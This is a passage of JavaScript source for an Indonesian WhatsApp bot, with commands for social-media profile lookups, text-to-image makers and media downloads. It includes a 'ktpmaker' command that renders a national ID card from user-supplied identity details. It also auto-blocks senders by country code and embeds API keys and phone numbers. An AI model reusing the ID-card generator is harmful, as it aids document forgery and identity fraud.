        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "stalktiktok") {
          data_deposit.data.usrname_ny = (chats)
          try {
            const fetchUser = await fetchJson(`https://saipulanuar.ga/api/download/tiktokstalk?username=${data_deposit.data.usrname_ny}`);
            console.log(fetchUser)
            if (fetchUser.result.status == false) return reply('Username timdack ditemukan!')
            let resUsr = fetchUser.result
            data_deposit.session = "use_ttstalk";
            fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
            var tik_text = `
  ◤──•~❉Tiktok Stalk❉~•──◥ 
  ➻ *Author:* GuraBot - MD
  ➻ *Username:* @${resUsr.username}
  ➻ *Fullname:* ${resUsr.nickname}
  ➻ *Followers:* ${resUsr.followers}
  ➻ *Following:* ${resUsr.following}
  ◣───────•~❉❉~•───────◢ 
`
            conn.sendMessage(from, { image: { url: resUsr.ppurl }, caption: tik_text }, { quoted: msg })
            fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
          } catch (err) {
            reply('Username timdack ditemukan!')
          }
        }
      }
    } else if (command === 'stalkig') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalkig",
          data: {
            name_usr: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("Silahkan ketik Username instagram nya\n*Contoh:* ekuzikaa_18")
      } else {
        reply("Username ig nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "stalkig") {
          data_deposit.data.name_usr = (chats)

          var x_ig = await fetchJson(`https://saipulanuar.ga/api/stalk/ig?username=${data_deposit.data.name_usr}`)
          if (x_ig.status == 500) return reply('Username tidak ditemukan.')
          data_deposit.session = "use_igstalk";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          var ig_text = `*INSTAGRAM STALKER*

*Author:* GuraBot - MD
*Username:* ${x_ig.result.username}
*FullName:* ${x_ig.result.fullName}
*Followers:* ${x_ig.result.followersM}
*Following:* ${x_ig.result.followingM}
*Bio:* ${x_ig.result.bio}
*Url:* https://instagram.com/${x_ig.result.username}
`
          conn.sendMessage(from, { image: { url: x_ig.result.profilePicHD }, caption: ig_text }, { quoted: msg })
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'stalknpm') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalknpm",
          data: {
            id_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim Username Npm*\n*Contoh:* hikki-me")
      } else {
        reply("Username npmnya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "stalknpm") {
          data_deposit.data.id_nya = (chats)

          var x = await fetchJson(`https://api.popcat.xyz/npm?q=${data_deposit.data.id_nya}`)
          if (x.error) return reply('Username tidak ditemukan\nSilahkan kirim username Npm yg benar.')
          data_deposit.session = "use_npmstalk";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          var npm_text = `*NPM STALKER*
name : ${x.name}
version : ${x.version}
description : ${x.description}
author : ${x.author}
author_email : ${x.author_email}
last_published : ${x.last_published}
maintainers : ${x.maintainers}
repository : ${x.repository}

keywords : ${x.keywords}`
          reply(npm_text)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'stalkgithub') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalkgithub",
          data: {
            id_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim Username Github*")
      } else {
        reply("username nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "stalkgithub") {
          data_deposit.data.id_nya = (chats)

          var git = await fetchJson(`https://api.github.com/users/${data_deposit.data.id_nya}`)
          data_deposit.session = "input_username_github";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          let textGitthub = `*STALK-GITHUB*
id : ${git.id}
login : ${git.login}
html_url : ${git.html_url}
type : ${git.type}
name : ${git.name}
location : ${git.location}
bio : ${git.bio}
public_repos : ${git.public_repos}
followers : ${git.followers}
following : ${git.following}
created : ${git.created_at}
updated : ${git.updated_at}`
          reply(textGitthub)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'besarkecil') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "besar_kecilnya",
          data: {
            text_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan tulis text yg ingin dijadiin besar dan kecil.*\n\n*Contoh:* hallo bro")
      } else {
        reply("nomor nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "besar_kecilnya") {
          data_deposit.data.text_nya = (chats)
          data_deposit.session = "text_nya_cuy";
          var xx_besar = await fetchJson(`https://api.nataganz.com/api/random/besarkecil?text=${data_deposit.data.text_nya}&apikey=Pasha`)
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*BESAR KECIL*
*Text:* ${data_deposit.data.text_nya}
*Hasil:* ${xx_besar.result.list}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'bilangangka') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "bilang_angkanya",
          data: {
            text_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan tulis number yg ingin dibilang.*\n\n*Contoh:* 1234")
      } else {
        reply("nomor nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "bilang_angkanya") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!")
          data_deposit.data.text_nya = Number(chats);
          data_deposit.session = "text_nya_cuy";
          var xx_bilang = await fetchJson(`https://api.nataganz.com/api/random/bilangangka?text=${data_deposit.data.text_nya}&apikey=Pasha`)
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*BILANG ANGKA*
*Nomor:* ${data_deposit.data.text_nya}
*Hasil:* ${xx_bilang.result.list}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'balikangka') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "balik_angkanya",
          data: {
            text_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan tulis number yg ingin dibalik.*\n\n*Contoh:* 1234")
      } else {
        reply("nomor nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "balik_angkanya") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!")
          data_deposit.data.text_nya = Number(chats);
          data_deposit.session = "text_nya_cuy";
          var xx_angka = await fetchJson(`https://api.nataganz.com/api/random/balikangka?text=${data_deposit.data.text_nya}&apikey=Pasha`)
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*BALIK ANGKA*
*Nomor Asli:* ${data_deposit.data.text_nya}
*Nomor Hasil:* ${xx_angka.result.list}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'balikhuruf') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "balik_hurufnya",
          data: {
            text_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan tulis text yg ingin dibalik.*\n\n*Contoh:* Ngetes")
      } else {
        reply("text nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "balik_hurufnya") {
          data_deposit.data.text_nya = (chats);
          data_deposit.session = "text_nya_cuy";
          var xx_huruf = await fetchJson(`https://api.nataganz.com/api/random/balikhuruf?text=${data_deposit.data.text_nya}&apikey=Pasha`)
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*BALIK HURUF*
*Text Asli:* ${data_deposit.data.text_nya}
*Text Hasil:* ${xx_huruf.result.list}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'stalkff') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalkff",
          data: {
            id_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim ID free fire kamu*")
      } else {
        reply("id ff nya mana kak?")
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "stalkff") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!")
          data_deposit.data.id_nya = Number(chats);
          let stalk_freefire = await stalkff(data_deposit.data.id_nya)
          if (stalk_freefire.status == 404) return reply('*Error ID tidak ditemukan*\n*Silahkan kirim ID yg valid*')
          data_deposit.session = "input_id_ff";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply(`*STALKER FF*
*ID:* ${data_deposit.data.id_nya}
*Username:* ${stalk_freefire.nickname}`)
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'tahta_maker') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          session: "tahta",
          data: {
            nulis_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim nama yang mau ditulis.*")
      } else {
        reply('Namanya apa?')
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "tahta") {
          data_deposit.data.nulis_nya = (chats);

          data_deposit.session = "tahta_yexftt";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply('Wait sedang menulis..')
          var tah = `https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${data_deposit.data.nulis_nya}&apikey=IkyOgiwara`
          conn.sendMessage(from, { image: { url: tah }, caption: 'Done!' }, { quoted: msg })
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    } else if (command === 'sadcat') {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var deposit_object = {
          session: "sadcat",
          data: {
            nulis_nya: ""
          }
        }
        fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
        reply("*Silahkan kirim text yang mau ditulis.*")
      } else {
        reply('Text yg mau jadiin sadcat mana??')
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_deposit = JSON.parse(fs.readFileSync(PathAuto + sender.split("@")[0] + ".json"))
        if (data_deposit.session === "sadcat") {
          data_deposit.data.nulis_nya = (chats);
          data_deposit.session = "masukan_texcatt";
          fs.writeFileSync(PathAuto + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
          reply('Wait sedang bikin makernya..')
          var nul = `https://api.popcat.xyz/sadcat?text=${data_deposit.data.nulis_nya}`
          conn.sendMessage(from, { image: { url: nul }, caption: 'Done!' }, { quoted: msg })
          fs.unlinkSync(PathAuto + sender.split('@')[0] + '.json')
        }
      }
    }

    msgFilter.ResetSpam(orang_spam)

    const spampm = () => {
      console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
      msgFilter.addSpam(sender, orang_spam)
      reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
    }

    const spamgr = () => {
      console.log(color('~>[SPAM]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
      msgFilter.addSpam(sender, orang_spam)
      reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
    }

    if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
    if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
    if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

    if (sender.startsWith('212')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('91')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('92')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('90')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('54')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('55')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('40')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('94')) {
      return conn.updateBlockStatus(sender, 'block')
    }
    if (sender.startsWith('60')) {
      return conn.updateBlockStatus(sender, 'block')
    }

    if (isGroup && isCmd && !fromMe) {
      console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
    }

    if (!isGroup && isCmd && !fromMe) {
      console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
    }

    switch (command) {
      case 'verify': {
        if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
        var res_us = `${makeid(10)}`
        var user_name = `#GR${makeid(5)}`
        var ownum = `628889616144@s.whatsapp.net`
        let object_user = { "id": sender, "name": user_name, "seri": res_us, "premium": false }
        db_user.push(object_user)
        fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, 2, null))
        var imgverify = 'https://i.postimg.cc/76GsLZ3n/carbon-verify.png'
        var itumenu = 'https://i.postimg.cc/nVwH9jYv/bocil2.jpg'
        mentions(`𝖬𝖾𝗆𝗎𝖺𝗍 𝖴𝗌𝖾𝗋 @${sender.split("@")[0]}`, [sender])
        await sleep(1000)
        var verify_teks = `
○ ID : @${sender.split('@')[0]}
○ Name : ${user_name}
○ Status : ${cekUser("premium", sender) ? 'Premium User' : 'Free User'}
○ Seri : ${res_us}

silahkan ketik #rules
untuk membaca rules bot
`
        var buttonMessage = {
          image: { url: imgverify },
          caption: verify_teks,
          footer: 'Klik button untuk melihat menu',
          mentions: [sender],
          buttons: [
            { buttonId: '#menu', buttonText: { displayText: '️⋮☰ 𝗠𝗘𝗡𝗨' }, type: 1 }
          ],
          headerType: 1
        }
        conn.sendMessage(from, buttonMessage, { quoted: msg })
        conn.sendMessage(ownerNumber, { text: `New User Register!\n○ ID : @${sender.split('@')[0]}`, mentions: [sender, ownum] }, { quoted: msg })
      }
        break
      case 'iklan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        var strip = '```'
        var menu_list = `
_Utamakan chat to the point_ 🚀

*_Admin hanya melayani chat_*
*_Seputar gurabot & transaksi_*

${strip}Telpon/Spam blokir 🚫${strip}

_Admin 1 : 0888-9616-144_
_Admin 2 : 0895-1900-9370_

*SCRIPT BOT 🛒*
_Rp25.000 - ( Fitur 300+ )_
_Rp55.000 - ( Fitur 500+ )_

*_Ready Nokos Whatsapp +1_*
*_Harga Murah? Chat Admin_*
*_Open Stok Terbatas⚠️_*

*_VIA : DANA/OVO/QRIS_*

*Minta SV? Sebut Nama 🙏*
*No Admin Reall Hanya*
*Di Atas, Selain Itu Clone*‼️
`
        reply(menu_list)
      }
        break
      case 'menu': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        var no = 1
        var ad = 1
        let namenya = `${cekUser("name", sender)}`
        let premnya = `${cekUser("premium", sender) ? 'Premium User' : 'Free User'}`
        let usernya = `${("id", db_user).length}`
        let romnya = `${db_menfes.length}`
        const gurbot = `${ownerNumber}`
        const mark_slebew = '0@s.whatsapp.net'
        /*var anumenu = fs.readFileSync('./function/menuPath/menu_nya.jpg')
        var jiim = Jimp.read(anumenu, (err, Jim) => {
          if (err) return reply(err)
          Jim
            .resize(1080, 576) // size
            .write(`./function/menuPath/menu_nya2.jpg`); // save
        })*/
        var runnya = `${runtime(process.uptime())}`
        var { upload, download } = await checkBandwidth()
        var footer_nya = `\n*NOTE:* jika menemukan bug/error\nSilahkan lapor ke Owner Bot.\n\n- @${gurbot.split("@")[0]} -\n`
        var menu_nya = `${listmenu(sender, prefix, ad, namenya, premnya, usernya, romnya, tanggal, jam, no, readmore, runnya, upload, download)}`
        let btn_menu = [
          { buttonId: `${prefix}owner`, buttonText: { displayText: '⋮☰ 𝗢𝗪𝗡𝗘𝗥' }, type: 1 },
          { buttonId: `${prefix}speedtest`, buttonText: { displayText: '⋮☰ 𝗦𝗣𝗘𝗘𝗗 𝗧𝗘𝗦𝗧' }, type: 1 },
          { buttonId: `${prefix}rules`, buttonText: { displayText: '⋮☰ 𝗥𝗨𝗟𝗘𝗦' }, type: 1 }
        ]
        var but_menu = {
          text: menu_nya,
          footer: footer_nya,
          buttons: btn_menu,
          mentions: [sender, mark_slebew],
          headerType: 1
        }
        conn.sendMessage(from, but_menu, { quoted: ftroli })
        await sleep(2500)
        //fs.unlinkSync(`./function/menuPath/menu_nya2.jpg`)
      }
        break
      case 'donate':
      case 'donasi': {
        var monoSpace = '```'
        let cekName = `${cekUser("name", sender)}`
        reply(donasiBot(cekName, ucapanWaktu))
      }
        break
      case 'infoowner':
      case 'ownerinfo': {
        reply(infoOwner())
      }
        break
      case 'infogempa':
        fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`)
          .then(xg => {
            let infgm = `*INFO GEMPA*

*tanggal:* ${xg.result.tanggal}
*jam:* ${xg.result.jam}
*datetime:* ${xg.result.datetime}
*coordinates:* ${xg.result.coordinates}
*lintang:* ${xg.result.lintang}
*bujur:* ${xg.result.bujur}
*magnitude:* ${xg.result.magnitude}
*kedalaman:* ${xg.result.kedalaman}
*wilayah:* ${xg.result.wilayah}
*potensi:* ${xg.result.potensi}
*dirasakan:* ${xg.result.dirasakan}`
          conn.sendMessage(from, { image: { url: xg.result.shakemap }, caption: infgm }, {quoted:msg})
          })
        break
      case 'wikimedia': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply('Contoh:\n#wikimedia viral')
        fetchJson(`https://saipulanuar.ga/api/search/wikimedia?query=${q}&apikey=jPHjZpQF`)
          .then(wk => {
            var text_wikimedia = `*WIKIMEDIA SEARCH*
*title:* ${wk.result.title}
*source:* ${wk.result.source}
*author:* wikimedia`
            conn.sendMessage(from, { image: { url: wk.result.image }, caption: text_wikimedia }, { quoted: msg })
          })
      }
        break
      case 'nulis':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q1 && !q2 && !q3 && !q4) return reply(`Contoh:\n${prefix + command} Ekuzika&11 Ipa&14&saya bukan wibu`)
        if (!q1) return reply(`nama lu mana?`)
        if (!q2) return reply(`lu kelas berapa?`)
        if (!q3) return reply(`lu absen ke berapa?`)
        if (!q4) return reply(`apa yang mau lu tulis?`)
        reply(mess.wait)
        try {
        var buc = `https://oni-chan.my.id/api/Fmake/nulis?nama=${q1}&kelas=${q2}&no=${q3}&text=${q4}&apikey=`
        conn.sendMessage(from, { image: { url: buc }, caption: 'Done!' }, { quoted: msg })
      } catch(e) {
        reply(`mungkin rest-api sedang error`)
      } 
        break
      case 'ktpmaker':
      case 'makerktp':
      case 'buatktp':
      case 'createktp':
      case 'ktp':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isQuotedImage && !isImage) return reply(`Kirim/reply image dengan caption ${prefix + command} nik&nama&tempat tanggal lahir&jenis kelamin&gol. darah&alamat&rt/rw&kel.&kec.&agama&status&pekerjaan&kewarganegaraan&berlaku hingga&prov.&kab.`)
        if (!q1 && !q2 && !q3 && !q4 && !q5 && !q6 && !q7 && !q8 && !q9 && !q10 && !q11 && !q12 && !q13 && !q14 && !q15 && !q16) return reply(`Example:\n\n${prefix + command} nik&nama&tempat tanggal lahir&jenis kelamin&gol. darah&alamat&rt/rw&kel.&kec.&agama&status&pekerjaan&kewarganegaraan&berlaku hingga&prov.&kab.`)
        if (!q1) return reply(`*Harap diisi semuanya*\nnik lu?`)
        if (!q2) return reply(`*Harap diisi semuanya*\nnama lu?`)
        if (!q3) return reply(`*Harap diisi semuanya*\nttg lu?`)
        if (!q4) return reply(`*Harap diisi semuanya*\ncwo/cwe?`)
        if (!q5) return reply(`*Harap diisi semuanya*\ngol. dar?`)
        if (!q6) return reply(`*Harap diisi semuanya*\nalamat?`)
        if (!q7) return reply(`*Harap diisi semuanya*\nrt/rw?`)
        if (!q8) return reply(`*Harap diisi semuanya*\nkel. ?`)
        if (!q9) return reply(`*Harap diisi semuanya*\nkec. ?`)
        if (!q10) return reply(`*Harap diisi semuanya*\nagama?`)
        if (!q11) return reply(`*Harap diisi semuanya*\nstatus?`)
        if (!q12) return reply(`*Harap diisi semuanya*\npekerjaan?`)
        if (!q13) return reply(`*Harap diisi semuanya*\nwarganegara?`)
        if (!q14) return reply(`*Harap diisi semuanya*\nberlaku hingga?`)
        if (!q15) return reply(`*Harap diisi semuanya*\nprov. ?`)
        if (!q16) return reply(`*Harap diisi semuanya*\nkab. ?`)
        reply(mess.wait)
        try {
        let ktpimg = await await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/ktpmaker.jpg`)
        let buffer_ktp = fs.readFileSync(ktpimg)
          var randktp = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${randktp}`, buffer_ktp)
          var { url } = await UploadFileUgu(randktp)
        let ktpnya = `https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${q1}&nama=${q2}&ttl=${q3}&jk=${q4}&gd=${q5}&almt=${q6}&rtw=${q7}&kel=${q8}&kc=${q9}&agm=${q10}&st=${q11}&krj=${q12}&ngr=${q13}&blk=${q14}&prv=${q15}&kab=${q16}&picturl=${url}&apikey=`
        conn.sendMessage(from, { image: { url: ktpnya }, caption: 'Nich cok ktp lu' }, {quoted:msg})
        } catch(e) {
          reply(`Error massbroo..`)
        }
        break
      case 'ttp':
        if (!q) return reply(`Example:\n${prefix + command} exz-bot`)
        try {
          let ttp2pn = `https://oni-chan.my.id/api/canvas/ttp?text=${q}&apikey=`
          var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
          conn.sendImageAsSticker(from, ttp2pn, msg, opt)
        } catch (e) {
          reply(`Emror kack`)
        }
        break
      case 'attp':
       if (!q) return reply(`Example:\n${prefix + command} exz-bot`)
        try {
       let ferd = `https://oni-chan.my.id/api/canvas/attp?text=${q}&apikey=`
         var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
         conn.sendImageAsSticker(from, ferd, msg, opt)
       } catch(e) {
    reply(`waduh error masbro..`)
       }
       break 
      case 'pinterest': case 'pin':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Contoh:\n${prefix + command} loli`)
        reply(mess.wait)
        var xa = require('xfarr-api');
        xa.search.pinterest(q)
          .then(pinn => {
            console.log(pinn)
            if (pinn.status != 200) return reply(`Sedang error`)
            //var mediapin = pickRandom(pinn.result)
            var pinterr = [{ buttonId: `!pin ${q}`, buttonText: { displayText: '⋮☰ NEXT' }, type: 1 }]
            conn.sendMessage(from, { caption: `Done *${q}*`, image: { url: pinn.url }, buttons: pinterr, footer: '© created by GuraBot - MD' })
          })
        break
     case 'darkjoke':
      case 'darkjokes':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        const dhn_api = require("dhn-api");
        let resss = await dhn_api.Darkjokes()
        console.log(resss)
        conn.sendImage(from, resss, 'hehe :v', msg)
        break
      case 'tts': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Contoh:\n${prefix + command} hallo bro`)
        var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
        conn.sendMessage(from, { audio: { url: tts }, mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
      }
        break
      case 'play':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply('*Contoh:*\n#play story wa jedag jedug 30 detik')
        reply(mess.wait)
        let search = await yts(q)
        let searchh = search.videos[Math.floor(Math.random() * search.videos.length)]
        //console.log(searchh)
        let lnk = searchh.url
        let resbuf = await fetchJson(`https://api.ibeng.tech/api/download/ytmp4?url=${lnk}&apikey=tamvan`)
        var shrturl = await fetchJson(`https://api.akuari.my.id/short/tinyurl?link=${resbuf.result.url}`)
        //if (rez.result[0].type !== 'video') return reply('Silahkan cari dengan kata kunci lain.')
        var txt_play = `
                *YOUTUBE - PLAY*
  
▫ *𝙏𝙞𝙩𝙡𝙚:* ${searchh.title}
▫ *𝘾𝙝𝙖𝙣𝙣𝙚𝙡:* ${resbuf.result.channel}
▫ *𝙋𝙪𝙗𝙡𝙞𝙨𝙝𝙚𝙙:* ${searchh.ago}
▫ *𝙑𝙞𝙚𝙬𝙨:* ${searchh.views}
▫ *𝙇𝙞𝙣𝙠:* ${shrturl.hasil}
`
        var btn_ply = [
          { buttonId: `!ytmp3 ${lnk}`, buttonText: { displayText: '⋮☰ 𝐏𝐋𝐀𝐘 𝐌𝐏𝟑' }, type: 1 },
        ]
        conn.sendMessage(from, { caption: txt_play, video: { url: resbuf.result.url }, buttons: btn_ply, footer: '© Gurabot - MD' })
        break
      case 'playmp3':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        try {
          if (!q) return reply('*Contoh:*\n#playmp3 story wa angel baby 30 detik')
          reply('Loading . . .')
          let z = await fetchJson(`https://rest-api-bwb9.onrender.com/api/search/ytplay?text=${q}&apikey=86541bad`)
          let playmp3 = z.result
          conn.sendMessage(from, { audio: { url: playmp3.mp3.result }, mimetype: 'audio/mpeg', fileName: playmp3.title + 'mp3' }, { quoted: msg })
        } catch (err) {
          reply(err)
        }
        break
      case 'soundcloud':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply('*Contoh:*\n#soundcloud https://soundcloud.com/ndaa-212683099/dj-coba-kau-ingat-ingat-kembali-seharusnya-aku-jungle-dutch-terbaru-2021-full-bass-viral-tik?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing')
        var yurl = q
        reply(mess.wait)
        try {
